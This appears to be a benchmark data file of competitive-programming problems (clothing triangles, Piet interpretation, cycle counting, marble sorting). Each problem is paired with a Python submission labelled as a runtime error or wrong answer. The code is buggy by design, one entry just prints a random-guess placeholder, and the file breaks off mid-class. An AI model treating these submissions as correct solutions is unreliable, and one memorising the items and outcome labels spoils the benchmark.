{"difficulty":1200,"lang":"Python 3","lang_cluster":"python","src_uid":"d90da1e932a6aa546bec4e1bd4b1fbec","submission_id":"re_589","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"from math import *\n\n\nclass graph:\n    # initialize graph\n    def __init__(self, gdict=None):\n        if gdict is None:\n            gdict = dict({})\n        self.gdict = gdict\n\n    # get edges\n    def edges(self):\n        return self.find_edges()\n\n    # find edges\n    def find_edges(self):\n        edges = []\n        for node in self.gdict:\n            for nxNode in self.gdict[node]:\n                if {nxNode, node} not in edges:\n                    edges.append({node, nxNode})\n        return edges\n\n    # Get verticies\n    def get_vertices(self):\n        return list(self.gdict.keys())\n\n    # add vertix\n    def add_vertix(self, node):\n        if node not in self.gdict:\n            self.gdict[node] = []\n\n    # add edge\n    def add_edge(self, edge):\n        edge = set(edge)\n        (node1, node2) = edge\n        if node1 in self.gdict:\n            self.gdict[node1].append(node2)\n        else:\n            self.gdict[node1] = [node2]\n\n        if node2 in self.gdict:\n            self.gdict[node2].append(node1)\n        else:\n            self.gdict[node2] = [node1]\n\n\ndef inp():\n    return map(int, input().split())\n\n\ndef arr_inp():\n    return [int(x) for x in input().split()]\n\n\nn, m = inp()\na = arr_inp()\ng = graph()\ncost = inf\n\nfor i in range(m):\n    u, v = inp()\n    g.add_edge((u, v))\n    if (i > 1):\n        for key in g.gdict:\n            if (u in g.gdict[key] and v in g.gdict[key]):\n                cost = min(cost, u + v + int(key))\n\nif (cost == inf):\n    print(-1)\nelse:\n    print(cost)\n","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items (). Next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the prices of the clothing items in rubles. Next m lines each contain a pair of space-separated integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,\u2009vi) are different.","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).","notes":"NoteIn the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.The second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.In the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1","3 2\n2 3 4\n2 3\n2 1","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1"],"sample_outputs":["6","-1","-1"]}
{"difficulty":1200,"lang":"Python 2","lang_cluster":"python","src_uid":"f8315dc903b0542c453cab4577bcb20d","submission_id":"re_704","tags":["implementation","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"def c(count):\n\tfor i in count:\n\t\tif i!=0:\n\t\t\treturn True\n\treturn False\nn,m=map(int,raw_input().split())\ndic={}\ncount=[0]\nfor i in range(1,n+1):\n\tdic[i]=[]\n\tcount.append(0)\nfor i  in range(m):\n\ta,b,=map(int,raw_input().split())\n\tcount[a] = count[a]+1\n\tcount[b] = count[b]+1\n\tdic[a].append(b)\n\tdic[b].append(a)\n# print count\nj=5\nFlag=True\nans=0\nimport copy\ncount_1 = copy.copy(count)\nwhile c(count_1):\n\tFlag=False\n\tcount=copy.copy(count_1)\n\tfor i in range(1,n+1):\n\t\tif c(count_1) and count[i]==1:\n\t\t\tFlag=True\n\t\t\tcount_1[i]=count_1[i]-1\n\t\t\tcount_1[dic[i][0]] = count_1[dic[i][0]]-1\n\t\t\tdic[dic[i][0]].remove(i)\n\t\t\tdic[i].pop(0)\n\tif not Flag:\n\t\tbreak\n\tans=ans+1\n\t# print count\nprint ans\n","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n,\u2009a\u2009\u2260\u2009b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.","notes":"NoteIn the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.In the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.In the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.","sample_inputs":["3 3\n1 2\n2 3\n3 1","6 3\n1 2\n2 3\n3 4","6 5\n1 4\n2 4\n3 4\n5 4\n6 4"],"sample_outputs":["0","2","1"]}
{"difficulty":800,"lang":"Python 3","lang_cluster":"python","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_494","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import math\nn=int(input())\nl=list(map(int,input().split()))\nd=0\ndiff=l[n-1]-l[0]\no1,o2=n,1\nfor i in range(n-1):\n    d=abs(l[i+1]-l[i])\n    if d<diff:\n        diff=d\n        o1=i+1\n        o2=i+2\nprint(o1,o2)","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":2100,"lang":"Python 2","lang_cluster":"python","src_uid":"09249ddeefb69734c50f9df3222ec7cb","submission_id":"re_1186","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"class Piet:\n    inc = [{'x':0,'y':-1},{'x':1,'y':0},{'x':0,'y':1},{'x':-1,'y':0}]\n    def __init__(self):\n        self.BP = {'x':0,'y':0}\n        self.DP = 1\n        self.CP = 0\n        self.getdata()\n        self.go()\n    def getdata(self):\n        in_line = raw_input().split()\n        self.m = int(in_line[0])\n        self.n = int(in_line[1])\n        self.pixels = []\n        for i in range(self.m):\n            self.pixels.append(raw_input())\n    def is_out_limit(self,x,y):\n        if x >= len(self.pixels[0]) or y >= self.m or x<0 or y<0:\n            return True\n        else:\n            return False\n    def go(self):\n        ans = []\n        for t in range(self.n):\n            print(self.BP['x'],self.BP['y'],self.DP,self.CP)\n            while True:\n                if self.is_out_limit(self.BP['x']+Piet.inc[self.DP]['x'],self.BP['y']+Piet.inc[self.DP]['y']):\n                    break\n                curr_color = self.pixels[self.BP['y']][self.BP['x']]\n                new_color = self.pixels[self.BP['y']+Piet.inc[self.DP]['y']][self.BP['x']+Piet.inc[self.DP]['x']]\n                if curr_color == new_color:\n                    self.BP['x'] += Piet.inc[self.DP]['x']\n                    self.BP['y'] += Piet.inc[self.DP]['y']\n                else:\n                    break\n            while True:\n                if self.is_out_limit(self.BP['x']+Piet.inc[self.CP]['x'],self.BP['y']+Piet.inc[self.CP]['y']):\n                    break\n                curr_color = self.pixels[self.BP['y']][self.BP['x']]\n                new_color = self.pixels[self.BP['y']+Piet.inc[self.CP]['y']][self.BP['x']+Piet.inc[self.CP]['x']]\n                if curr_color == new_color:\n                    self.BP['x'] += Piet.inc[self.CP]['x']\n                    self.BP['y'] += Piet.inc[self.CP]['y']\n                else:\n                    break\n            if  self.is_out_limit(self.BP['x']+Piet.inc[self.DP]['x'],self.BP['y']+Piet.inc[self.DP]['y']) or self.pixels[self.BP['y']+Piet.inc[self.DP]['y']][self.BP['x']+Piet.inc[self.DP]['x']] == '0':\n                if self.DP == (self.CP + 1)%4:\n                    self.CP = (self.CP + 2)%4\n                else:\n                    self.DP = (self.DP + 1)%4\n                    self.CP = (self.DP - 1)%4\n            else:\n                self.BP['x'] += Piet.inc[self.DP]['x']\n                self.BP['y'] += Piet.inc[self.DP]['y']\n            if self.BP['x'] == fBPx and self.BP['y'] == fBPy and self.DP == fDP and self.CP ==fCP:\n                print ans[(self.n-1)%len(ans)]\n                break\n            else:\n                if len(ans) == 0:\n                    fBPx = self.BP['x']\n                    fBPy = self.BP['y']\n                    fDP = self.DP\n                    fCP = self.CP\n                ans.append(self.pixels[self.BP['y']][self.BP['x']])\n        else:\n            print ans[-1] \n\ndef main():\n    p = Piet()\n\nif __name__ == '__main__':\n    main()\n","description":"Piet is one of the most known visual esoteric programming languages. The programs in Piet are constructed from colorful blocks of pixels and interpreted using pretty complicated rules. In this problem we will use a subset of Piet language with simplified rules.The program will be a rectangular image consisting of colored and black pixels. The color of each pixel will be given by an integer number between 0 and 9, inclusive, with 0 denoting black. A block of pixels is defined as a rectangle of pixels of the same color (not black). It is guaranteed that all connected groups of colored pixels of the same color will form rectangular blocks. Groups of black pixels can form arbitrary shapes.The program is interpreted using movement of instruction pointer (IP) which consists of three parts: current block pointer (BP); note that there is no concept of current pixel within the block; direction pointer (DP) which can point left, right, up or down; block chooser (CP) which can point to the left or to the right from the direction given by DP; in absolute values CP can differ from DP by 90 degrees counterclockwise or clockwise, respectively.Initially BP points to the block which contains the top-left corner of the program, DP points to the right, and CP points to the left (see the orange square on the image below).One step of program interpretation changes the state of IP in a following way. The interpreter finds the furthest edge of the current color block in the direction of the DP. From all pixels that form this edge, the interpreter selects the furthest one in the direction of CP. After this, BP attempts to move from this pixel into the next one in the direction of DP. If the next pixel belongs to a colored block, this block becomes the current one, and two other parts of IP stay the same. It the next pixel is black or outside of the program, BP stays the same but two other parts of IP change. If CP was pointing to the left, now it points to the right, and DP stays the same. If CP was pointing to the right, now it points to the left, and DP is rotated 90 degrees clockwise.This way BP will never point to a black block (it is guaranteed that top-left pixel of the program will not be black).You are given a Piet program. You have to figure out which block of the program will be current after n steps.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integer numbers m (1\u2009\u2264\u2009m\u2009\u2264\u200950) and n (1\u2009\u2264\u2009n\u2009\u2264\u20095\u00b7107). Next m lines contain the rows of the program. All the lines have the same length between 1 and 50 pixels, and consist of characters 0-9. The first character of the first line will not be equal to 0.","output_spec":"Output the color of the block which will be current after n steps of program interpretation.","notes":"NoteIn the first example IP changes in the following way. After step 1 block 2 becomes current one and stays it after two more steps. After step 4 BP moves to block 3, after step 7 \u2014 to block 4, and finally after step 10 BP returns to block 1.  The sequence of states of IP is shown on the image: the arrows are traversed clockwise, the main arrow shows direction of DP, the side one \u2014 the direction of CP.","sample_inputs":["2 10\n12\n43","3 12\n1423\n6624\n6625","5 9\n10345\n23456\n34567\n45678\n56789"],"sample_outputs":["1","6","5"]}
{"difficulty":2400,"lang":"Python 2","lang_cluster":"python","src_uid":"0f49b4a5696ee71ebbc8f83d1ec3b901","submission_id":"re_643","tags":["number theory","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ndef primes(n):\n    pr = range(n)\n    for i in xrange(2,n):\n        if not pr[i]: continue\n        ii=i*i\n        if ii>n: break\n        pr[ii::i]=[0]*len(pr[ii::i])\n    return filter(None,pr)[1:]\n\nn,x = map(int,raw_input().split())\na = set(map(int,raw_input().split()))\npr = primes(x)\nif all(p in a for p in pr): print len(pr)\nelse: print -1\n    ","description":"Vasya plays The Elder Trolls III: Morrowindows. He has a huge list of items in the inventory, however, there is no limits on the size of things. Vasya does not know the total amount of items but he is sure that are not more than x and not less than 2 items in his inventory. A new patch for the game appeared to view inventory in n different modes. Displaying in mode i is a partition of all inventory items on pages, each of which (except for maybe the last one) shows exactly ai items. In addition, each mode shows how many pages bi is in a complete list. Great! Perhaps this information will be enough for Vasya to find the required number. Moreover, it is very interesting, what is the fewest number of modes in which Vasya can see inventory to determine the number of items in it?Vasya cannot use the information that was received while looking on inventory in some mode for selection of next actions. I. e. Vasya chooses some set of modes first, and then sees all the results and determines the size.Knowing the number of ai, x and assuming that Vasya is very smart, check whether he can uniquely determine the number of items in his inventory, and how many modes he will need to do that if he knows numbers ai, x and he is able to know number bi after viewing items in mode i.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and x (0\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20092\u2009\u2264\u2009x\u2009\u2264\u2009109). The second line contains integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009109). Some numbers among all ai may be equal.","output_spec":"Output the fewest amount of modes required to uniquely determine amount of items in the inventory. If there is no solution output \u2009-\u20091.","notes":"NoteIn the second example Vasya is not able to determine items count uniquely because 3 items, as well as 4 items, can be displayed on two pages.","sample_inputs":["2 4\n2 3","1 4\n2"],"sample_outputs":["2","-1"]}
{"difficulty":2200,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"11_D","submission_id":"210250448","tags":["bitmasks","dp","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"N, M = [int(w) for w in input().split()]\ngraph = [[] for _ in range(N)]\ndp = [[0] * (2 ** N) for _ in range(N)]\n\nself_circles = 0\n\nfor _ in range(M):\n    a, b = [int(w) - 1 for w in input().split()]\n    if a == b:\n        self_circles += 1\n    else:\n        graph[a].append(b)\n        graph[b].append(a)\n\nfor i in range(N):\n    dp[i][1 << i] = 1\n\nresult = -M\nfor i in range(2 ** N):\n    for j in range(N):\n        if dp[j][i] == 0:\n            continue\n        for k in graph[j]:\n            mask_k = 2 ** k\n            if mask_k < (i & (-i)):\n                continue\n            if mask_k & i > 0:\n                if mask_k == i & (- i):\n                    result += dp[j][i]\n            else:\n                dp[k][i | mask_k] += dp[j][i]\n \nprint(result\/\/2)\n","description":"Given a simple graph, output the number of simple cycles in it. A simple cycle is a cycle with no repeated vertices or edges.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains two integers n and m (1\u2264n\u226419, 0\u2264m) \u2013 respectively the number of vertices and edges of the graph. Each of the subsequent m lines contains two integers a and b, (1\u2264a,b\u2264n, a\u2260b) indicating that vertices a and b are connected by an undirected edge. There is no more than one edge connecting any pair of vertices.\n","output_spec":"Output the number of cycles in the given graph.\n","notes":"The example graph is a clique and contains four cycles of length 3 and three cycles of length 4.\n","sample_inputs":["4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4\n"],"sample_outputs":["7\n"]}
{"difficulty":2200,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"1215_E","submission_id":"167090551","tags":["bitmasks","dp"],"exec_outcome":"WRONG_ANSWER","source_code":"from sys import stdin\r\ninput = stdin.readline\r\n\r\ninp = lambda : list(map(int,input().split()))\r\n\r\n\r\ndef b_s(key , i):\r\n\r\n    l , h = 0 , len(pos[i]) - 1\r\n    ans = len(pos[i])\r\n    while(l <= h):\r\n\r\n        mid = (l + h) \/\/ 2\r\n        if(a[mid] < key):\r\n            l = mid + 1\r\n        else:\r\n            ans = mid\r\n            h = mid - 1\r\n\r\n    return ans\r\n\r\n\r\ndef solve(mask):\r\n\r\n    if(mask == (1 << 20) - 1):return 0\r\n    if(dp[mask] != -1):return dp[mask]\r\n\r\n    p = 0\r\n    for j in range(20):\r\n        if(mask >> j & 1):\r\n            p += len(pos[j])\r\n\r\n    \r\n    ans = float('inf')\r\n    for j in range(20):\r\n        if(mask >> j & 1):continue\r\n\r\n        x = len(pos[j])\r\n        ind = b_s(p , j)\r\n        addval = (pref[j][x] - pref[j][ind]) - (x * (x - 1)) \/\/ 2\r\n        ans = min(ans , solve(mask | (1 << j)) + addval)\r\n\r\n\r\n    dp[mask] = ans\r\n    return ans\r\n        \r\n\r\n\r\ndef answer():\r\n\r\n\r\n    global dp , pos , pref\r\n\r\n    pref = [[0] for j in range(20)]\r\n    pos = [[] for i in range(20)]\r\n    for i in range(n):\r\n        pos[a[i]].append(i)\r\n        pref[a[i]].append(pref[a[i]][-1] + i)\r\n\r\n\r\n    dp = [-1 for i in range(1 << 20)]\r\n\r\n    ans = solve(0)\r\n    return ans\r\n      \r\nfor T in range(1):\r\n\r\n    n = int(input())\r\n    a = inp()\r\n\r\n    for i in range(n):\r\n        a[i] -= 1\r\n\r\n    print(answer())\r\n","description":"Monocarp has arranged $$$n$$$ colored marbles in a row. The color of the $$$i$$$-th marble is $$$a_i$$$. Monocarp likes ordered things, so he wants to rearrange marbles in such a way that all marbles of the same color form a contiguos segment (and there is only one such segment for each color). In other words, Monocarp wants to rearrange marbles so that, for every color $$$j$$$, if the leftmost marble of color $$$j$$$ is $$$l$$$-th in the row, and the rightmost marble of this color has position $$$r$$$ in the row, then every marble from $$$l$$$ to $$$r$$$ has color $$$j$$$.To achieve his goal, Monocarp can do the following operation any number of times: choose two neighbouring marbles, and swap them.You have to calculate the minimum number of operations Monocarp has to perform to rearrange the marbles. Note that the order of segments of marbles having equal color does not matter, it is only required that, for every color, all the marbles of this color form exactly one contiguous segment.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$n$$$ $$$(2 \\le n \\le 4 \\cdot 10^5)$$$ \u2014 the number of marbles.\nThe second line contains an integer sequence $$$a_1, a_2, \\dots, a_n$$$ $$$(1 \\le a_i \\le 20)$$$, where $$$a_i$$$ is the color of the $$$i$$$-th marble.\n","output_spec":"Print the minimum number of operations Monocarp has to perform to achieve his goal.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1900,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"1216_E1","submission_id":"145351210","tags":["binary+search","brute+force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"import sys\r\nimport io, os\r\ninput = io.BytesIO(os.read(0,os.fstat(0).st_size)).readline\r\n\r\nN = 10**5\r\ns = []\r\nfor i in range(1, N):\r\n    s += list(str(i))\r\n\r\nq = int(input())\r\n\r\nfor _ in range(q):\r\n    k = int(input())\r\n    k -= 1\r\n    l = 0\r\n    for i in range(1, N):\r\n        k -= l\r\n        l += len(str(i))\r\n        if 0 <= k <= l:\r\n            print(s[k])\r\n            break\r\n","description":"The only difference between the easy and the hard versions is the maximum value of $$$k$$$.You are given an infinite sequence of form \"112123123412345$$$\\dots$$$\" which consist of blocks of all consecutive positive integers written one after another. The first block consists of all numbers from $$$1$$$ to $$$1$$$, the second one \u2014 from $$$1$$$ to $$$2$$$, the third one \u2014 from $$$1$$$ to $$$3$$$, $$$\\dots$$$, the $$$i$$$-th block consists of all numbers from $$$1$$$ to $$$i$$$. So the first $$$56$$$ elements of the sequence are \"11212312341234512345612345671234567812345678912345678910\". Elements of the sequence are numbered from one. For example, the $$$1$$$-st element of the sequence is $$$1$$$, the $$$3$$$-rd element of the sequence is $$$2$$$, the $$$20$$$-th element of the sequence is $$$5$$$, the $$$38$$$-th element is $$$2$$$, the $$$56$$$-th element of the sequence is $$$0$$$.Your task is to answer $$$q$$$ independent queries. In the $$$i$$$-th query you are given one integer $$$k_i$$$. Calculate the digit at the position $$$k_i$$$ of the sequence.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer $$$q$$$ ($$$1 \\le q \\le 500$$$) \u2014 the number of queries.\nThe $$$i$$$-th of the following $$$q$$$ lines contains one integer $$$k_i$$$ $$$(1 \\le k_i \\le 10^9)$$$ \u2014 the description of the corresponding query.\n","output_spec":"Print $$$q$$$ lines. In the $$$i$$$-th line print one digit $$$x_i$$$ $$$(0 \\le x_i \\le 9)$$$ \u2014 the answer to the query $$$i$$$, i.e. $$$x_i$$$ should be equal to the element at the position $$$k_i$$$ of the sequence.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2200,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"1216_E2","submission_id":"216024235","tags":["binary+search","math"],"exec_outcome":"WRONG_ANSWER","source_code":"print(\"_RANDOM_GUESS_1690505925.0309489\")# 1690505925.0309696","description":"The only difference between the easy and the hard versions is the maximum value of $$$k$$$.You are given an infinite sequence of form \"112123123412345$$$\\dots$$$\" which consist of blocks of all consecutive positive integers written one after another. The first block consists of all numbers from $$$1$$$ to $$$1$$$, the second one \u2014 from $$$1$$$ to $$$2$$$, the third one \u2014 from $$$1$$$ to $$$3$$$, $$$\\dots$$$, the $$$i$$$-th block consists of all numbers from $$$1$$$ to $$$i$$$. So the first $$$56$$$ elements of the sequence are \"11212312341234512345612345671234567812345678912345678910\". Elements of the sequence are numbered from one. For example, the $$$1$$$-st element of the sequence is $$$1$$$, the $$$3$$$-rd element of the sequence is $$$2$$$, the $$$20$$$-th element of the sequence is $$$5$$$, the $$$38$$$-th element is $$$2$$$, the $$$56$$$-th element of the sequence is $$$0$$$.Your task is to answer $$$q$$$ independent queries. In the $$$i$$$-th query you are given one integer $$$k_i$$$. Calculate the digit at the position $$$k_i$$$ of the sequence.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer $$$q$$$ ($$$1 \\le q \\le 500$$$) \u2014 the number of queries.\nThe $$$i$$$-th of the following $$$q$$$ lines contains one integer $$$k_i$$$ $$$(1 \\le k_i \\le 10^{18})$$$ \u2014 the description of the corresponding query.\n","output_spec":"Print $$$q$$$ lines. In the $$$i$$$-th line print one digit $$$x_i$$$ $$$(0 \\le x_i \\le 9)$$$ \u2014 the answer to the query $$$i$$$, i.e. $$$x_i$$$ should be equal to the element at the position $$$k_i$$$ of the sequence.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2100,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"1216_F","submission_id":"226234674","tags":["data+structures","dp","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import random\r\nimport sys\r\nfrom math import inf\r\n\r\nfrom typing import List\r\n\r\n\r\n# sys.setrecursionlimit(10**8)\u00e8\u00ae\u00be\u00e7\u00bd\u00ae\u00e6\u009c\u0080\u00e5\u00a4\u00a7\u00e9\u0080\u0092\u00e5\u00bd\u0092\u00e6\u00ac\u00a1\u00e6\u0095\u00b0\r\n\r\n\r\nclass FastIO:\r\n    def __init__(self):\r\n        self.random_seed = random.randint(0, 10 ** 9 + 7)\r\n        return\r\n\r\n    @staticmethod\r\n    def read_int():\r\n        return int(sys.stdin.readline().strip())\r\n\r\n    @staticmethod\r\n    def read_float():\r\n        return float(sys.stdin.readline().strip())\r\n\r\n    @staticmethod\r\n    def read_list_ints():\r\n        return list(map(int, sys.stdin.readline().strip().split()))\r\n\r\n    @staticmethod\r\n    def read_list_floats():\r\n        return list(map(float, sys.stdin.readline().strip().split()))\r\n\r\n    @staticmethod\r\n    def read_list_ints_minus_one():\r\n        return list(map(lambda x: int(x) - 1, sys.stdin.readline().strip().split()))\r\n\r\n    @staticmethod\r\n    def read_str():\r\n        return sys.stdin.readline().strip()\r\n\r\n    @staticmethod\r\n    def read_list_strs():\r\n        return sys.stdin.readline().strip().split()\r\n\r\n    @staticmethod\r\n    def read_list_str():\r\n        return list(sys.stdin.readline().strip())\r\n\r\n    @staticmethod\r\n    def st(x):\r\n        return print(x)\r\n\r\n    @staticmethod\r\n    def lst(x):\r\n        return print(*x)\r\n\r\n    @staticmethod\r\n    def round_5(f):\r\n        res = int(f)\r\n        if f - res >= 0.5:\r\n            res += 1\r\n        return res\r\n\r\n    @staticmethod\r\n    def max(a, b):\r\n        return a if a > b else b\r\n\r\n    @staticmethod\r\n    def min(a, b):\r\n        return a if a < b else b\r\n\r\n    @staticmethod\r\n    def ceil(a, b):\r\n        return a \/\/ b + int(a % b != 0)\r\n\r\n    def hash_num(self, x):\r\n        return x ^ self.random_seed\r\n\r\n    @staticmethod\r\n    def accumulate(nums):\r\n        n = len(nums)\r\n        pre = [0] * (n + 1)\r\n        for i in range(n):\r\n            pre[i + 1] = pre[i] + nums[i]\r\n        return pre\r\n\r\n    def inter_ask(self, lst):\r\n        # CF\u00e4\u00ba\u00a4\u00e4\u00ba\u0092\u00e9\u00a2\u0098\u00e8\u00be\u0093\u00e5\u0087\u00ba\u00e8\u00af\u00a2\u00e9\u0097\u00ae\u00e5\u00b9\u00b6\u00e8\u00af\u00bb\u00e5\u008f\u0096\u00e7\u00bb\u0093\u00e6\u009e\u009c\r\n        self.st(lst)\r\n        sys.stdout.flush()\r\n        res = self.read_int()\r\n        # \u00e8\u00ae\u00b0\u00e5\u00be\u0097\u00e4\u00bb\u00bb\u00e4\u00bd\u0095\u00e4\u00b8\u0080\u00e4\u00b8\u00aa\u00e8\u00be\u0093\u00e5\u0087\u00ba\u00e4\u00b9\u008b\u00e5\u0090\u008e\u00e9\u0083\u00bd\u00e8\u00a6\u0081 sys.stdout.flush() \u00e5\u0088\u00b7\u00e6\u0096\u00b0\r\n        return res\r\n\r\n    def inter_out(self, lst):\r\n        # CF\u00e4\u00ba\u00a4\u00e4\u00ba\u0092\u00e9\u00a2\u0098\u00e8\u00be\u0093\u00e5\u0087\u00ba\u00e6\u009c\u0080\u00e7\u00bb\u0088\u00e7\u00ad\u0094\u00e6\u00a1\u0088\r\n        self.st(lst)\r\n        sys.stdout.flush()\r\n        return\r\n\r\nclass SegmentTreeUpdateQueryMin:\r\n    # \u00e6\u00a8\u00a1\u00e6\u009d\u00bf\u00ef\u00bc\u009a\u00e7\u00ba\u00bf\u00e6\u00ae\u00b5\u00e6\u00a0\u0091\u00e5\u008c\u00ba\u00e9\u0097\u00b4\u00e6\u009b\u00b4\u00e6\u0096\u00b0\u00e3\u0080\u0081\u00e6\u008c\u0081\u00e7\u00bb\u00ad\u00e5\u0087\u008f\u00e5\u00b0\u008f\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n    def __init__(self, n):\r\n        self.height = [inf]*(4*n)\r\n        self.lazy = [inf]*(4*n)\r\n        self.n = n\r\n\r\n    def build(self, nums: List[int]):\r\n        # \u00e4\u00bd\u00bf\u00e7\u0094\u00a8\u00e6\u0095\u00b0\u00e7\u00bb\u0084\u00e5\u0088\u009d\u00e5\u00a7\u008b\u00e5\u008c\u0096\u00e7\u00ba\u00bf\u00e6\u00ae\u00b5\u00e6\u00a0\u0091\r\n        stack = [[0, self.n - 1, 1]]\r\n        while stack:\r\n            s, t, ind = stack.pop()\r\n            if ind >= 0:\r\n                if s == t:\r\n                    self.make_tag(ind, nums[s])\r\n                else:\r\n                    stack.append([s, t, ~ind])\r\n                    m = s + (t - s) \/\/ 2\r\n                    stack.append([s, m, 2 * ind])\r\n                    stack.append([m + 1, t, 2 * ind + 1])\r\n            else:\r\n                ind = ~ind\r\n                self.push_up(ind)\r\n        return\r\n\r\n    def get(self):\r\n        # \u00e6\u009f\u00a5\u00e8\u00af\u00a2\u00e5\u008c\u00ba\u00e9\u0097\u00b4\u00e7\u009a\u0084\u00e6\u0089\u0080\u00e6\u009c\u0089\u00e5\u0080\u00bc\r\n        stack = [[0, self.n-1, 1]]\r\n        nums = [inf]*self.n\r\n        while stack:\r\n            s, t, i = stack.pop()\r\n            if s == t:\r\n                nums[s] = self.height[i]\r\n                continue\r\n            m = s + (t - s) \/\/ 2\r\n            self.push_down(i)\r\n            stack.append([s, m, 2 * i])\r\n            stack.append([m + 1, t, 2 * i + 1])\r\n        return nums\r\n\r\n    @staticmethod\r\n    def min(a, b):\r\n        return a if a < b else b\r\n\r\n    def push_down(self, i):\r\n        # \u00e6\u0087\u0092\u00e6\u00a0\u0087\u00e8\u00ae\u00b0\u00e4\u00b8\u008b\u00e6\u0094\u00be\u00ef\u00bc\u008c\u00e6\u00b3\u00a8\u00e6\u0084\u008f\u00e5\u008f\u0096\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n        if self.lazy[i] != inf:\r\n            self.height[2 * i] = self.min(self.height[2 * i], self.lazy[i])\r\n            self.height[2 * i + 1] = self.min(self.height[2 * i + 1], self.lazy[i])\r\n\r\n            self.lazy[2 * i] = self.min(self.lazy[2 * i], self.lazy[i])\r\n            self.lazy[2 * i + 1] = self.min(self.lazy[2 * i + 1], self.lazy[i])\r\n\r\n            self.lazy[i] = inf\r\n        return\r\n\r\n    def make_tag(self, i, val):\r\n        self.height[i] = self.min(self.height[i], val)\r\n        self.lazy[i] = self.min(self.lazy[i], val)\r\n        return\r\n\r\n    